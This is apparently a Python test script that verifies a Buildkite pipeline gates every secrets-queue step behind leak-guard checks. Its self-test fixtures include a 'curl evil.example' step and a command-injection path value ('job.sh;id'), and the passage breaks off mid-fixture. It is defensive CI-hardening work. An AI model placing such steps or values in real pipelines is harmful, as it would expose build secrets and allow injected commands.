#!/usr/bin/env python3
"""S2 (WAVE-26506): R1 fixture-(f) style proof that a failing leak guard
blocks every secret-bearing step in .buildkite/pipeline.yml.

Checks (all must PASS, exit 0):
  1. pipeline.yml parses as YAML with a `steps:` list.
  1g. Guards carry no soft_fail/allow_failure/branches/skip; guard-gitleaks
      also carries no `if`. guard-content-policy's `if` is check 7, not an
      open escape hatch. Waits carry no continue_on_failure (WAVE-27331 gap 1).
  1h. No `group:` nesting — the walk is top-level only (gap 3).
  1i. No plural `commands:` lists — the walk keys on `command` and would
      skip them while BK runs every entry (review).
  2. guard-gitleaks is the first gated step. When guard-content-policy is on
     the secrets queue, guard-content-policy-pr sits between the two guards
     on fpc-isolated, sets WAVE_JOB_GUARD_PR, runs on pull-request builds only
     (`if: build.pull_request.id != null`; the guard accepts the flag only on
     a pull request), and the next step depends on both.
  2p. Probe set is empty, the pinned trio, or that trio plus probe-absence-env-pr.
      Probes precede gated steps. Every probe is in report mode: it
      soft-fails on FLAG only. probe-absence-env may use the secrets queue
      only with the check-7 condition, and probe-absence-env-pr runs the same
      script on fpc-isolated for every other build (P4 PROMOTION.md).
  2s. soft_fail / allow_failure appear only on the report-mode probes.
  3. Every secret-bearing step (agents.queue == fpc-isolated-secrets) has BOTH  # guard:allow BK pipeline schema attribute, not a repo reference
     guards in its must-pass set under Buildkite wait/depends_on semantics.
     Waits with continue_on_failure:true are NOT barriers (gap 2).
  4. Failure simulation: a failing guard blocks every secret-bearing step;
     4b asserts the COMPLETE blocked set (every later step, gap 5).
  5. Every command step's command is an existing .sh/.mjs directly under
     .buildkite/scripts/ with no metacharacters (gap 4).
  6. simulate() fails loudly on unknown keys; when governance-enforce is
     present its failure must block every later step (gap 6).
  7. Every step on fpc-isolated-secrets has an `if` that requires BOTH
     build.pull_request.id == null AND build.branch == pipeline.default_branch.
     `build.pull_request.id == null` alone fails: a branch push is not a
     pull request. There is NO exemption: no step on the secrets queue can
     run on a pull-request build (governance-enforce included, main-only
     since WAVE-30137, the fleet main-only governance policy). PR builds never get secrets.
     The walk covers EVERY step, not only `command` steps: plugin-only,
     trigger, block/input, `agents` in list form, and steps nested in a
     `group` (each step's own `if` is checked; check 1h still fails groups).
  8. When present, governance-enforce runs on fpc-isolated with no step env
     (WAVE-30138): it gets packages through the loopback registry proxy and
     receives no injected value, so it never needs the secrets queue.

Run: python3 .buildkite/tests/pipeline-gating.py [--pipeline PATH] [--selftest]
  --selftest runs inline positive+negative fixtures per new assertion (no
  network, tmp dirs only) instead of checking the real pipeline.
  (needs python3 + pyyaml)
"""
import re
import sys
import tempfile
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent.parent.parent
DEFAULT_PIPELINE = ROOT / ".buildkite" / "pipeline.yml"

SECRETS_QUEUE = "fpc-isolated-secrets"
GUARD_KEYS = ("guard-gitleaks", "guard-content-policy")
# BK pipeline schema attributes that must never appear on a guard step — a
# guard that can soft-fail, skip, or narrow itself is not a gate.  # guard:allow BK pipeline schema attributes, not repo references
# `if` is not in this list: the secrets-queue content-policy guard must
# carry the closed condition from check 7. guard-gitleaks still rejects `if`.
FORBIDDEN_GUARD_KEYS = ("soft_fail", "allow_failure", "branches", "skip")
PINNED_PROBES = ("probe-absence-env", "probe-absence-fs", "probe-absence-log")
PINNED_PROBES_WITH_PR = PINNED_PROBES + ("probe-absence-env-pr",)
# Every probe stays in report mode (soft_fail on FLAG only) until the
# PROMOTION.md flip; the env probe's queue split does not change that.
REPORT_MODE_PROBES = ("probe-absence-env", "probe-absence-env-pr",
                      "probe-absence-fs", "probe-absence-log")
EXPECTED_PROBE_COMMANDS = {
    "probe-absence-env": ".buildkite/scripts/probe-absence-env.mjs",
    "probe-absence-env-pr": ".buildkite/scripts/probe-absence-env.mjs",
    "probe-absence-fs": ".buildkite/scripts/probe-absence-fs.mjs",
    "probe-absence-log": ".buildkite/scripts/probe-absence-log.mjs",
}
# No secrets-queue exemption exists (WAVE-30137): the former pull-request-only
# governance-enforce exemption let PR builds reach fpc-isolated-secrets.
_NON_PR_ATOM = "build.pull_request.id==null"
_DEFAULT_BRANCH_ATOM = "build.branch==pipeline.default_branch"
_PR_ATOM = "build.pull_request.id!=null"
_OTHER_BRANCH_ATOM = "build.branch!=pipeline.default_branch"
EXPECTED_GUARDS = (
    {
        "label": ":key: guard gitleaks",
        "key": "guard-gitleaks",
        "command": ".buildkite/scripts/guard-gitleaks.sh",
        "queue": "fpc-isolated",
        "timeout_in_minutes": 10,
    },
    {
        "label": ":clipboard: guard content-policy",
        "key": "guard-content-policy",
        "command": ".buildkite/scripts/guard-content-policy.sh",
        "queue": SECRETS_QUEUE,
        "timeout_in_minutes": 10,
    },
)

EXPECTED_RETRY = {
    "automatic": [
        {"exit_status": -1, "limit": 1},
        {"signal_reason": "agent_stop", "limit": 1},
    ],
    "manual": {"allowed": True, "permit_on_passed": False},
}


def _norm_expr(expr):
    if not isinstance(expr, str):
        return ""
    return re.sub(r"\s+", " ", expr.strip())


def _condition_atoms(expr, separator):
    """Split a Buildkite `if` into clauses, or return None if the shape is not
    a flat conjunction (`&&`) or disjunction (`||`)."""
    if not isinstance(expr, str) or not expr.strip():
        return None
    if separator not in ("&&", "||"):
        return None
    compact = re.sub(r"\s+", "", expr)
    other = "||" if separator == "&&" else "&&"
    if other in compact:
        return None
    # `!=` is a comparison, not boolean negation. A bare `!` is rejected.
    if "!" in compact.replace("!=", ""):
        return None
    if not re.fullmatch(r"[A-Za-z0-9_.=()&|!]+", compact):
        return None
    parts = compact.split(separator)
    if any(part == "" for part in parts):
        return None
    atoms = []
    for part in parts:
        atom = part
        while atom.startswith("(") and atom.endswith(")") and len(atom) >= 2:
            atom = atom[1:-1]
        if not atom or "(" in atom or ")" in atom:
            return None
        atoms.append(atom)
    return atoms


def if_requires_non_pr_and_default_branch(expr):
    """True only when `expr` requires both atoms, joined by `&&`:

    - build.pull_request.id == null
    - build.branch == pipeline.default_branch

    `build.pull_request.id == null` alone is False. That clause also matches
    a branch push, which is not a pull request, so it must not by itself
    select the secrets queue. Extra `||` clauses, a missing `if`, and either
    atom alone are False. Clause order and wrapping parentheses do not matter.
    """
    atoms = _condition_atoms(expr, "&&")
    if atoms is None or len(atoms) != 2:
        return False
    return sorted(atoms) == sorted([_NON_PR_ATOM, _DEFAULT_BRANCH_ATOM])


def if_is_pull_request_or_other_branch(expr):
    """True only for the complement: a pull request OR a non-default branch.

    `build.pull_request.id != null` alone is False, because a non-pull-request
    push of some other branch would then run neither step.
    """
    atoms = _condition_atoms(expr, "||")
    if atoms is None or len(atoms) != 2:
        return False
    return sorted(atoms) == sorted([_PR_ATOM, _OTHER_BRANCH_ATOM])


def if_is_pull_request_only(expr):
    """True only for `build.pull_request.id != null` on its own.

    guard-content-policy-pr sets WAVE_JOB_GUARD_PR=1, which the guard accepts
    only on a pull-request build. An `if` that also matches a push to another
    branch would run it there and fail closed (WAVE-30137 review).
    """
    atoms = _condition_atoms(expr, "||")
    return atoms is not None and atoms == [_PR_ATOM]


def step_queue(step):
    """The agents queue a step targets: `agents: {queue: q}` or
    `agents: ["queue=q"]`. None when the step names no queue."""
    agents = step.get("agents") if isinstance(step, dict) else None
    if isinstance(agents, dict):
        return agents.get("queue")  # guard:allow BK pipeline keyword, not a repo reference
    if isinstance(agents, list):
        for a in agents:
            if isinstance(a, str) and a.startswith("queue="):
                return a[len("queue="):]
    return None


def walk_steps(steps):
    """Every step dict, of any type (command, plugin-only, trigger,
    block/input, group), including steps nested in a `group`."""
    for s in steps or []:
        if not isinstance(s, dict):
            continue
        yield s
        if "group" in s:
            yield from walk_steps(s.get("steps"))


def is_wait(step):
    if step == "wait":
        return True
    return isinstance(step, dict) and "wait" in step


def is_blocking_wait(step):
    """A bare `wait` (or `wait: ~`) is a barrier; a wait carrying
    continue_on_failure:true lets later steps run despite earlier failures,
    so it is NOT a barrier (WAVE-27331 gap 2)."""
    if not is_wait(step):
        return False
    if isinstance(step, dict):
        return step.get("continue_on_failure") is not True
    return True


def depends_of(step):
    deps = step.get("depends_on", []) if isinstance(step, dict) else []
    if isinstance(deps, str):
        deps = [deps]
    return [d if isinstance(d, str) else d.get("step") for d in deps]


def must_pass(steps, by_key, step, self_key):
    """Keys that must have PASSED for `step` to start: every command step
    in an earlier wait-segment (barrier semantics) plus transitive
    depends_on targets. Same-segment steps run CONCURRENTLY — listing
    order within a segment gates nothing."""
    must = set()
    seg = set()
    for s in steps:
        if is_wait(s):
            if is_blocking_wait(s):
                must |= seg
            seg = set()
            continue
        if not (isinstance(s, dict) and "command" in s):
            continue
        if s is step:
            break
        seg.add(s.get("key"))
    stack = [d for d in depends_of(step) if d in by_key]
    while stack:
        dep = by_key[stack.pop()]
        if dep.get("key") in must:
            continue
        must.add(dep.get("key"))
        stack.extend(d for d in depends_of(dep) if d in by_key)
    must.discard(None)
    must.discard(self_key)
    return must


def barrier_must_pass(steps, step):
    must, seg = set(), set()
    for s in steps:
        if is_wait(s):
            if is_blocking_wait(s):
                must |= seg
            seg = set()
            continue
        if not (isinstance(s, dict) and "command" in s):
            continue
        if s is step:
            return must
        seg.add(s.get("key"))
    return must


def simulate(steps, commands, by_key, failed_key):
    """Return (ran, blocked) key lists if `failed_key` fails. Fails LOUDLY
    on an unknown key — a simulation over a missing step is vacuous and
    must never read as ALL PASS (WAVE-27331 gap 6)."""
    if failed_key not in by_key:
        raise KeyError(f"simulate: unknown step key {failed_key!r}")
    failed = {failed_key}
    ran, blocked = [], []
    for s in commands:
        key = s.get("key")
        if key == failed_key:
            ran.append(key)
            continue
        mp = must_pass(steps, by_key, s, key)
        if s.get("allow_dependency_failure", False) is True:
            mp = barrier_must_pass(steps, s)
        (blocked if (mp & failed) else ran).append(key)
    return ran, blocked


def evaluate(pipeline_path, root):
    """Run every check against one pipeline file. Returns a list of
    (name, passed, detail) rows; failures is [name for failing rows]."""
    rows = []

    def check(name, cond, detail=""):
        rows.append((name, bool(cond), detail))

    try:
        doc = yaml.safe_load(Path(pipeline_path).read_text())
    except Exception as exc:  # noqa: BLE001 — unreadable pipeline fails closed
        check("1 pipeline parses with steps list", False, str(exc))
        return rows
    check("1 pipeline parses with steps list",
          isinstance(doc, dict) and isinstance(doc.get("steps"), list))
    if not rows[-1][1]:
        return rows
    steps = doc["steps"]

    # 1h — no group nesting (the walk below is top-level only).
    grouped = [i for i, s in enumerate(steps)
               if isinstance(s, dict) and "group" in s]
    check("1h no group: nesting", not grouped, f"steps[{grouped}]" if grouped else "")

    # 1i — no plural `commands:` lists. A step with `commands:` (list) has no
    # `command` key, so the walk below would skip it entirely while BK runs
    # every entry — an ungated code-execution bypass. One script path per
    # step (the no-command-eval convention); multi-command steps refuse.
    listed = [i for i, s in enumerate(steps)
              if isinstance(s, dict) and "commands" in s]
    check("1i no commands: lists", not listed, f"steps[{listed}]" if listed else "")

    commands = [s for s in steps if isinstance(s, dict) and "command" in s]

    # 1g — guards carry no escape hatches; waits carry no continue_on_failure.
    by_key_all = {c.get("key"): c for c in commands if c.get("key")}
    for gkey in GUARD_KEYS:
        g = by_key_all.get(gkey)
        if g is None:
            check(f"1g {gkey} present", False, "missing guard step")
            continue
        bad = [k for k in FORBIDDEN_GUARD_KEYS if k in g]
        # gitleaks has no secrets and must run on every build. The
        # content-policy guard's `if` is the closed secrets-queue condition.
        if gkey == "guard-gitleaks" and "if" in g:
            bad.append("if")
        check(f"1g {gkey} carries no escape hatch", not bad, f"has {bad}" if bad else "")
    for i, s in enumerate(steps):
        if isinstance(s, dict) and "wait" in s and s.get("continue_on_failure") is True:
            check(f"1g steps[{i}] wait carries no continue_on_failure", False,
                  "non-blocking wait weakens every barrier")

    # P4 (PROMOTION.md): R2 absence probes (probe-*) run UNGATED by design —
    # zero injection by construction, so they are not secret-bearing even
    # when one asserts on the secrets queue. They must precede the guards.
    # Shapes without probes (trivial tier) carry an empty set — also valid.
    probes = [c for c in commands if (c.get("key") or "").startswith("probe-")]
    gated = [c for c in commands if not (c.get("key") or "").startswith("probe-")]
    probe_keys = sorted(c.get("key") for c in probes)
    allowed_probe_sets = {tuple(sorted(PINNED_PROBES)), tuple(sorted(PINNED_PROBES_WITH_PR))}
    check("2p probe set empty or exactly the pinned trio",
          probe_keys == [] or tuple(probe_keys) in allowed_probe_sets,
          f"got {probe_keys}")
    if probes:
        check("2p probes precede all gated steps",
              all(commands.index(p) < commands.index(g) for p in probes for g in gated),
              f"got {[c.get('key') for c in commands[:4]]}")
        for p in probes:
            key = p.get("key")
            queue = step_queue(p)  # guard:allow BK pipeline keyword, not a repo reference
            if key in REPORT_MODE_PROBES:
                check(f"2p {key} soft-fails FLAG only, never internal errors",
                      p.get("soft_fail") == [{"exit_status": 1}],
                      f"got {p.get('soft_fail')!r}")
            else:
                check(f"2p {key} does not soft-fail",
                      "soft_fail" not in p and "allow_failure" not in p,
                      f"got soft_fail={p.get('soft_fail')!r}")
            check(f"2p {key} command pinned to vendored script",
                  p.get("command") == EXPECTED_PROBE_COMMANDS.get(key),
                  f"got {p.get('command')!r}")
            if key == "probe-absence-env":
                check(f"2p {key} secrets queue only with closed if",
                      queue == SECRETS_QUEUE and if_requires_non_pr_and_default_branch(p.get("if")),  # guard:allow BK pipeline keyword, not a repo reference
                      f"queue={queue!r} if={p.get('if')!r}")
                check(f"2p {key} carries no env", "env" not in p,
                      "the secrets-queue env probe must not extend its own allowlist")
            else:
                check(f"2p {key} never on secrets queue",
                      queue != SECRETS_QUEUE,  # guard:allow BK pipeline keyword, not a repo reference
                      "only probe-absence-env may ride the secrets queue (it asserts absence there); any other probe-* key would bypass gating")
            check(f"2p {key} carries no depends_on", "depends_on" not in p,
                  "probe must run ungated")
        env_probe = next((p for p in probes if p.get("key") == "probe-absence-env"), None)
        if env_probe is not None and step_queue(env_probe) == SECRETS_QUEUE:  # guard:allow BK pipeline keyword, not a repo reference
            pr_probe = next((p for p in probes if p.get("key") == "probe-absence-env-pr"), None)
            check("2p probe-absence-env-pr accompanies the secrets env probe", pr_probe is not None,
                  "pull requests and other branches must still run the env probe, off the secrets queue")
            if pr_probe is not None:
                pr_queue = step_queue(pr_probe)  # guard:allow BK pipeline keyword, not a repo reference
                check("2p probe-absence-env-pr runs on fpc-isolated for other builds",
                      pr_queue == "fpc-isolated"
                      and if_is_pull_request_or_other_branch(pr_probe.get("if"))
                      and pr_probe.get("command") == EXPECTED_PROBE_COMMANDS["probe-absence-env-pr"]
                      and "env" not in pr_probe
                      and pr_probe.get("soft_fail") == [{"exit_status": 1}]
                      and "allow_failure" not in pr_probe,
                      f"queue={pr_queue!r} if={pr_probe.get('if')!r}")

    # soft_fail is report mode for the absence probes only.
    for c in commands:
        if "soft_fail" not in c and c.get("allow_failure") is not True:
            continue
        key = c.get("key")
        check(f"2s {key} soft_fail only on report-mode probes",
              key in REPORT_MODE_PROBES and c.get("soft_fail") == [{"exit_status": 1}]
              and "allow_failure" not in c,
              f"soft_fail={c.get('soft_fail')!r}")

    # 2 — guards first (among gated steps), byte-identical fields.
    gated_keys = [c.get("key") for c in gated]
    by_gated = {c.get("key"): c for c in gated}
    check("2a guard-gitleaks is the first gated step",
          bool(gated_keys) and gated_keys[0] == "guard-gitleaks",
          f"got {gated_keys[:3]}")
    for exp in EXPECTED_GUARDS:
        cmd = by_gated.get(exp["key"])
        if cmd is None:
            check(f"2b {exp['key']} present", False, "missing")
            continue
        for field in ("label", "key", "command", "timeout_in_minutes"):
            check(f"2b {exp['key']}.{field} identical", cmd.get(field) == exp[field],
                  f"got {cmd.get(field)!r}")
        check(f"2b {exp['key']}.queue identical", step_queue(cmd) == exp["queue"],  # guard:allow BK pipeline keyword, not a repo reference
              f"got {(cmd.get('agents') or {}).get('queue')!r}")  # guard:allow BK pipeline keyword, not a repo reference
        check(f"2c {exp['key']}.retry policy identical", cmd.get("retry") == EXPECTED_RETRY)

    secrets_guard = by_gated.get("guard-content-policy")
    if secrets_guard is not None and step_queue(secrets_guard) == SECRETS_QUEUE:  # guard:allow BK pipeline keyword, not a repo reference
        comp = by_gated.get("guard-content-policy-pr")
        check("2d guard-content-policy-pr present", comp is not None,
              "pull requests must run content-policy off the secrets queue")
        if comp is not None:
            comp_env = comp.get("env") or {}
            comp_queue = step_queue(comp)  # guard:allow BK pipeline keyword, not a repo reference
            hatch = [k for k in ("soft_fail", "allow_failure", "branches", "skip") if k in comp]
            check("2d guard-content-policy-pr is the non-secrets step",
                  comp.get("command") == ".buildkite/scripts/guard-content-policy.sh"
                  and comp_queue == "fpc-isolated"
                  and if_is_pull_request_only(comp.get("if"))
                  and set(comp_env) == {"WAVE_JOB_GUARD_PR"}
                  and comp_env.get("WAVE_JOB_GUARD_PR") == "1"
                  and not hatch
                  and comp.get("timeout_in_minutes") == 10
                  and comp.get("retry") == EXPECTED_RETRY
                  and gated_keys[:3] == [
                      "guard-gitleaks",
                      "guard-content-policy-pr",
                      "guard-content-policy",
                  ],
                  f"queue={comp_queue!r} if={comp.get('if')!r} env={comp_env!r} "
                  f"hatch={hatch} order={gated_keys[:3]}")

    by_key = {c["key"]: c for c in commands if "key" in c}

    if "guard-content-policy-pr" in by_key and "guard-content-policy" in by_gated:
        sec_i = gated_keys.index("guard-content-policy")
        if sec_i + 1 < len(gated_keys):
            nxt = by_key[gated_keys[sec_i + 1]]
            mp = must_pass(steps, by_key, nxt, nxt.get("key"))
            needed = ("guard-gitleaks", "guard-content-policy", "guard-content-policy-pr")
            missing = [k for k in needed if k not in mp]
            check("2d later steps depend on both content-policy steps", not missing,
                  f"must-pass={sorted(mp)}" if not missing else f"missing {missing}")

    # 3 — every secret-bearing step gated on BOTH guards.
    secret_steps = [c for c in gated if step_queue(c) == SECRETS_QUEUE]  # guard:allow BK pipeline keyword, not a repo reference
    check("3a secret-bearing steps found", len(secret_steps) >= 1, f"got {len(secret_steps)}")
    for s in secret_steps:
        mp = must_pass(steps, by_key, s, s.get("key"))
        missing = [g for g in GUARD_KEYS if g != s.get("key") and g not in mp]
        check(f"3b {s.get('key')} gated on both guards", not missing,
              f"must-pass={sorted(mp)}" if not missing else f"missing {missing}")

    # 4 — failure simulation + COMPLETE blocked set (gap 5).
    for gkey in GUARD_KEYS:
        try:
            ran, blocked = simulate(steps, commands, by_key, gkey)
        except KeyError as exc:
            check(f"4 failing {gkey} simulated", False, str(exc))
            continue
        leaked = [k for k in ran
                  if step_queue(by_key[k]) == SECRETS_QUEUE  # guard:allow BK pipeline keyword, not a repo reference
                  and k != gkey and not k.startswith("probe-")]
        check(f"4 failing {gkey} blocks every secret-bearing step", not leaked,
              f"blocked={blocked}" if not leaked else f"LEAKED={leaked}")
        order = [c.get("key") for c in commands]
        later = order[order.index(gkey) + 1:]
        escaped = [k for k in later if k in ran]
        check(f"4b failing {gkey} blocks EVERY later step", not escaped,
              f"blocked={len(blocked)}" if not escaped else f"ESCAPED={escaped}")
        rows.append((f"    simulate {gkey}=fail: ran={ran} blocked={blocked}", True, ""))

    # 5 — no-command-eval convention, hardened (gap 4): an existing
    # .sh/.mjs directly under .buildkite/scripts/, no metacharacters, and
    # the RESOLVED target must stay inside the scripts dir (is_file follows
    # symlinks — a bare existence check is bypassable).
    pat = re.compile(r"^\.buildkite/scripts/[A-Za-z0-9_][A-Za-z0-9_.-]*\.(sh|mjs)$")
    scripts_dir = (root / ".buildkite" / "scripts").resolve()
    for c in commands:
        cmd = c.get("command", "")
        shape_ok = isinstance(cmd, str) and bool(pat.match(cmd))
        target = (root / cmd).resolve() if shape_ok else None
        try:
            contained = target is not None and target.relative_to(scripts_dir) is not None
        except ValueError:
            contained = False
        exists_ok = shape_ok and (root / cmd).is_file()
        ok = shape_ok and exists_ok and contained
        detail = f"got {cmd!r}"
        if shape_ok and not exists_ok:
            detail += " (missing from checkout)"
        elif shape_ok and not contained:
            detail += " (resolves outside .buildkite/scripts/)"
        check(f"5 {c.get('key')} pinned existing script path", ok, detail)

    # 6 — governance-enforce failure gate (gap 6): simulate() already fails
    # loudly on unknown keys; when the step exists its failure must block
    # every later step (trivial-tier shapes without it note the skip).
    try:
        simulate(steps, commands, by_key, "definitely-not-a-step")
        check("6a simulate fails loudly on unknown keys", False, "no error raised")
    except KeyError:
        check("6a simulate fails loudly on unknown keys", True, "")
    if "governance-enforce" in by_key:
        _ran, blocked = simulate(steps, commands, by_key, "governance-enforce")
        order = [c.get("key") for c in commands]
        later = order[order.index("governance-enforce") + 1:]
        escaped = [k for k in later if k in _ran]
        check("6b failing governance-enforce blocks every later step", not escaped,
              f"blocked={len(blocked)}" if not escaped else f"ESCAPED={escaped}")
    else:
        rows.append(("6b governance-enforce absent (trivial-tier shape) — skipped", True, ""))

    # 7 — secrets queue admits only a non-PR build of the default branch.
    # `build.pull_request.id == null` alone is a failure: that also matches
    # a branch push. No key is exempt: a pull-request build must never be
    # able to select the secrets queue (WAVE-30137).
    # The walk covers EVERY step, not just `command` steps: plugin-only,
    # trigger, block/input, and steps nested in a `group` (whose own `if` is
    # checked; a group-level `if` does not count).
    for i, c in enumerate(walk_steps(steps)):
        if step_queue(c) != SECRETS_QUEUE:
            continue
        key = c.get("key") or c.get("label") or f"step#{i}"
        check(f"7 {key} secrets queue requires non-PR and default branch",
              if_requires_non_pr_and_default_branch(c.get("if")),
              f"if={c.get('if')!r}; pull_request.id == null alone is not enough")

    # 8 — governance-enforce is secret-free (WAVE-30138): loopback registry
    # proxy, no injected value, so it must sit on fpc-isolated with no env.
    gov_step = by_key.get("governance-enforce")
    if gov_step is not None:
        gq = step_queue(gov_step)  # guard:allow BK pipeline keyword, not a repo reference
        check("8 governance-enforce runs on fpc-isolated with no step env",
              gq == "fpc-isolated" and not gov_step.get("env"),
              f"queue={gq!r} env_keys={sorted((gov_step.get('env') or {}).keys())}")

    return rows


def _write_tree(files):
    """Create a tmp repo root with .buildkite/scripts/<name> files."""
    root = Path(tempfile.mkdtemp(prefix="gating-"))
    scripts = root / ".buildkite" / "scripts"
    scripts.mkdir(parents=True)
    for name in files:
        (scripts / name).write_text("#!/bin/sh\n")
    return root


def _evaluate_yaml(doc_yaml, files):
    root = _write_tree(files)
    pipe = root / ".buildkite" / "pipeline.yml"
    pipe.write_text(doc_yaml)
    return evaluate(str(pipe), root)


def _failed(rows, prefix):
    return [n for (n, ok, _d) in rows if n.startswith(prefix) and not ok]


def selftest():
    """Positive+negative fixtures per new WAVE-27331 assertion. No network."""
    RETRY_YAML = ("retry: {automatic: [{exit_status: -1, limit: 1}, "
                  "{signal_reason: agent_stop, limit: 1}], "
                  "manual: {allowed: true, permit_on_passed: false}}")
    GUARD_A = ("  - label: ':key: guard gitleaks'\n    key: guard-gitleaks\n"
               "    command: .buildkite/scripts/guard-gitleaks.sh\n"
               "    agents: {queue: fpc-isolated}\n    timeout_in_minutes: 10\n"  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
               f"    {RETRY_YAML}\n")
    CLOSED_IF = ("build.pull_request.id == null && "
                 "build.branch == pipeline.default_branch")
    OPEN_IF = ("build.pull_request.id != null || "
               "build.branch != pipeline.default_branch")
    WEAK_IF = "build.pull_request.id == null"
    PR_IF = "build.pull_request.id != null"
    GUARD_B_PR = ("  - label: ':clipboard: guard content-policy (pull request)'\n"
                  "    key: guard-content-policy-pr\n"
                  "    command: .buildkite/scripts/guard-content-policy.sh\n"
                  f"    if: {PR_IF}\n"
                  "    env: {WAVE_JOB_GUARD_PR: '1'}\n"
                  "    agents: {queue: fpc-isolated}\n"  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
                  "    timeout_in_minutes: 10\n"
                  f"    {RETRY_YAML}\n")
    GUARD_B = ("  - label: ':clipboard: guard content-policy'\n"
               "    key: guard-content-policy\n"
               "    command: .buildkite/scripts/guard-content-policy.sh\n"
               f"    if: {CLOSED_IF}\n"
               "    agents: {queue: fpc-isolated-secrets}\n"  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
               "    timeout_in_minutes: 10\n"
               f"    {RETRY_YAML}\n")
    SECRET_JOB = ("  - label: secret job\n    key: secret-job\n"
                  "    command: .buildkite/scripts/job.sh\n"
                  f"    if: {CLOSED_IF}\n"
                  "    agents: {queue: fpc-isolated-secrets}\n")  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
    FILES = ("guard-gitleaks.sh", "guard-content-policy.sh", "job.sh")
    VALID = ("steps:\n" + GUARD_A + "  - wait: ~\n" + GUARD_B_PR + GUARD_B
             + "  - wait: ~\n" + SECRET_JOB)

    fails = []

    def t(name, cond, detail=""):
        print(("PASS" if cond else "FAIL") + f" selftest {name}" + (f" — {detail}" if detail else ""))
        if not cond:
            fails.append(name)

    # Positive: minimal valid shape passes everything.
    rows = _evaluate_yaml(VALID, FILES)
    bad = [n for (n, ok, _d) in rows if not ok and not n.startswith("    simulate")]
    t("valid shape ALL PASS", not bad, f"{bad}" if bad else "")

    # Gap 1 negatives: escape hatches on guards / waits.
    rows = _evaluate_yaml(VALID.replace("key: guard-gitleaks\n",
                                        "key: guard-gitleaks\n    soft_fail: true\n"), FILES)
    t("gap1 guard soft_fail caught", bool(_failed(rows, "1g")), "")
    rows = _evaluate_yaml(VALID.replace("key: guard-content-policy\n",
                                        "key: guard-content-policy\n    branches: main\n"), FILES)
    t("gap1 guard branches caught", bool(_failed(rows, "1g")), "")
    rows = _evaluate_yaml(VALID.replace("  - wait: ~\n",
                                        "  - wait: ~\n    continue_on_failure: true\n", 1), FILES)
    t("gap1 wait continue_on_failure caught", bool(_failed(rows, "1g")), "")

    # Gap 2 engine: non-blocking wait is not a barrier (direct unit proof).
    doc = yaml.safe_load(VALID.replace("  - wait: ~\n",
                                       "  - wait: ~\n    continue_on_failure: true\n"))
    cmds = [s for s in doc["steps"] if isinstance(s, dict) and "command" in s]
    bk = {c["key"]: c for c in cmds}
    job = bk["secret-job"]
    mp = must_pass(doc["steps"], bk, job, "secret-job")
    t("gap2 continue_on_failure wait drops earlier segment", "guard-gitleaks" not in mp,
      f"must={sorted(mp)}")
    ran, _blocked = simulate(doc["steps"], cmds, bk, "guard-gitleaks")
    t("gap2 failure after soft wait still runs", "secret-job" in ran, f"ran={ran}")
    doc2 = yaml.safe_load(VALID)
    cmds2 = [s for s in doc2["steps"] if isinstance(s, dict) and "command" in s]
    bk2 = {c["key"]: c for c in cmds2}
    _ran2, blocked2 = simulate(doc2["steps"], cmds2, bk2, "guard-gitleaks")
    t("gap2 bare wait still barriers", "secret-job" in blocked2, "")

    # Gap 3 negative: group nesting fails.
    rows = _evaluate_yaml(VALID + "  - group: g\n    steps:\n" + SECRET_JOB.replace("key: secret-job", "key: nested"), FILES)
    t("gap3 group nesting caught", bool(_failed(rows, "1h")), "")
    rows = _evaluate_yaml(VALID + "  - label: sneaky\n    key: sneak\n    commands:\n      - .buildkite/scripts/job.sh\n      - curl evil.example\n", FILES)
    t("review commands: list caught", bool(_failed(rows, "1i")), "")

    # Gap 4 negatives: metachars / missing / subdir commands.
    rows = _evaluate_yaml(VALID.replace(".buildkite/scripts/job.sh",
                                        ".buildkite/scripts/job.sh;id"), FILES)
    t("gap4 shell metachars caught", bool(_failed(rows, "5 secret-job")), "")
    rows = _evaluate_yaml(VALID.replace(".buildkite/scripts/job.sh",
                                        ".buildkite/scripts/nope.sh"), FILES)
    t("gap4 missing script caught", bool(_failed(rows, "5 secret-job")), "")
    rows = _evaluate_yaml(VALID.replace(".buildkite/scripts/job.sh",
                                        ".buildkite/scripts/sub/job.sh"), FILES)
    t("gap4 subdir path caught", bool(_failed(rows, "5 secret-job")), "")

    # Review hardening: symlinked script escaping the scripts dir fails.
    root = _write_tree(FILES)
    outside = root / "outside.sh"
    outside.write_text("#!/bin/sh\n")
    link = root / ".buildkite" / "scripts" / "job.sh"
    link.unlink()
    link.symlink_to(outside)
    pipe = root / ".buildkite" / "pipeline.yml"
    pipe.write_text(VALID)
    rows = evaluate(str(pipe), root)
    t("review symlink escape caught", bool(_failed(rows, "5 secret-job")), "")

    # Review hardening: strict argv (typos fail loudly, never test default).
    t("review unknown flag rejected", main(["--nope"]) == 2, "")
    t("review value-less --pipeline rejected", main(["--pipeline"]) == 2, "")
    vroot = _write_tree(FILES)
    vpipe = vroot / ".buildkite" / "pipeline.yml"
    vpipe.write_text(VALID)
    import io as _io
    from contextlib import redirect_stdout as _rs
    with _rs(_io.StringIO()):
        rc = main(["--pipeline", str(vpipe)])
    t("review root defaults to pipeline checkout", rc == 0, f"rc={rc}")

    # Gap 5 engine: 4b is load-bearing — same-segment later step escapes.
    doc3 = yaml.safe_load("steps:\n" + GUARD_A.replace("    retry:", "    # retry:") +
                          "  - label: z\n    key: zed\n    command: .buildkite/scripts/job.sh\n")
    cmds3 = [s for s in doc3["steps"] if isinstance(s, dict) and "command" in s]
    bk3 = {c["key"]: c for c in cmds3}
    ran3, _b3 = simulate(doc3["steps"], cmds3, bk3, "guard-gitleaks")
    t("gap5 same-segment step escapes guard failure", "zed" in ran3, f"ran={ran3}")

    # Gap 6: unknown key loud; governance failure blocks later steps.
    try:
        simulate(doc2["steps"], cmds2, bk2, "nope-missing")
        t("gap6 unknown key loud", False, "no error")
    except KeyError:
        t("gap6 unknown key loud", True, "")
    gov = ("  - label: gov\n    key: governance-enforce\n"
           "    command: .buildkite/scripts/job.sh\n"
           "    agents: {queue: fpc-isolated-secrets}\n")  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
    evil = ("  - label: evil\n    key: evil-secret\n"
            "    command: .buildkite/scripts/job.sh\n"
            "    agents: {queue: fpc-isolated-secrets}\n")  # guard:allow BK agents/queue keywords in synthetic fixture, not a repo reference
    leak_pipe = ("steps:\n" + GUARD_A + "  - wait: ~\n" + GUARD_B
